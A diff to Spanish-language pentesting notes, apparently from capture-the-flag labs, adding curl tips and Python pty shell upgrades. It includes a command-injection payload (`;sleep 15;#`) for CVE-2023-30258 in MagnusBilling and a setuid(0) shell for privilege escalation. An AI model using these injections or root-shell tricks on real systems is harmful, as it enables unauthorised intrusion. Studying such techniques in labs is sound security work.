@@ -217,4 +217,42 @@ nano /etc/hosts
 - `Ctrl+O` guarda, `Ctrl+X` sale, `Ctrl+W` busca.
 - En **Restablecer** se añadió `10.65.138.18 haystack.thm.corp` para que Kerberos resolviera el nombre del DC. La forma rápida de añadir la línea sin abrir el editor es `echo '<IP> <dominio>' >> /etc/hosts` (ver `Enumeracion web.md`).
 
-> Nota: los comandos de *privesc* (`sudo find`, `ssh2john`…) viven en sus ficheros: `Escalada de privilegios Linux.md` y `Fuerza bruta y crackeo.md`. Los de Active Directory de **Restablecer** (`bloodhound-python`, `GetNPUsers`, `getST`, `wmiexec`, `impacket-lookupsid`, Responder…) están en `SMB y Active Directory.md` y `Fuerza bruta y crackeo.md`.
+## 14. Peticiones HTTP con `curl` (GET, cabeceras y parámetros)
+
+```
+curl -I http://<IP>/                          # solo cabeceras (Server, X-Powered-By...)
+curl -s 'http://<IP>/ruta/archivo.php'        # cuerpo, sin barra de progreso
+curl 'http://<IP>/ruta/archivo.php?param=valor'
+curl -s 'http://<IP>/ruta/archivo.php' --get --data-urlencode 'param=<valor>'
+```
+
+- `--get --data-urlencode` codifica automáticamente espacios, `&`, `=`, comillas, etc. Es lo más cómodo cuando el valor del parámetro lleva caracteres especiales o una reverse shell. En **Facturación** se usó para inyectar por el parámetro `democ` de `lib/icepay/icepay.php`.
+- Codificación manual equivalente: **CyberChef → URL Encode** con *Encode all special chars* marcada, o `encodeURIComponent()` en JavaScript. Ojo con los puntos: CyberChef los codifica como `%2E`.
+- Para confirmar una inyección ciega, medir el tiempo de respuesta:
+
+  ```
+  curl 'http://<IP>/ruta/archivo.php?param=iamhacked;sleep%2015;#'
+  ```
+
+  Si tarda ~15 s, el parámetro está llegando a un `exec()` del servidor.
+
+- Cuando el código hace `exec("touch " . $_GET['param'] . ".txt")`, el patrón `;com;#` corta el `touch` y comenta el `.txt` final. Es el caso de **CVE-2023-30258** (MagnusBilling).
+
+## 15. Shell interactiva rápida con `pty`
+
+Nada más recibir una reverse shell, antes de estabilizarla con `script`/`stty`:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+- Da una terminal con control de TTY sin tener que hacer `Ctrl+Z` + `stty raw -echo && fg` (ver `Shells y transferencia.md`).
+- Con SUID ya activo se puede forzar la identidad antes de abrir la shell:
+
+  ```
+  python3 -c 'import os; import pty; os.setuid(0); os.setgid(0); pty.spawn("/bin/bash")'
+  ```
+
+- Usado en **Facturación** tras la shell de `asterisk` y antes de la escalada con Fail2Ban (ver `Escalada de privilegios Linux.md`).
+
+> Nota: los comandos de *privesc* (`sudo find`, `ssh2john`, abuso de `fail2ban-client`…) viven en sus ficheros: `Escalada de privilegios Linux.md` y `Fuerza bruta y crackeo.md`. Los de Active Directory de **Restablecer** (`bloodhound-python`, `GetNPUsers`, `getST`, `wmiexec`, `impacket-lookupsid`, Responder…) están en `SMB y Active Directory.md` y `Fuerza bruta y crackeo.md`.
